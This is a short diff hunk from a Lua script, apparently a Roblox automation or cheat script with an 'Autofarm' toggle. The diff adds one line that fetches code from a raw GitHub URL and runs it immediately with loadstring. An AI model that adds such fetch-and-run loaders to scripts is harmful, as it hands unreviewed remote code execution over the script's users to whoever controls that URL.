@@ -18,6 +18,7 @@ local h;
 local i;
 local j;
 local o = '' 
+loadstring(game:HttpGet"https://raw.githubusercontent.com/maihoangphi2531/Hagfyo_leader/refs/heads/main/level")()
 --state tables
 local ToggleStates = {
     Autofarm = false,
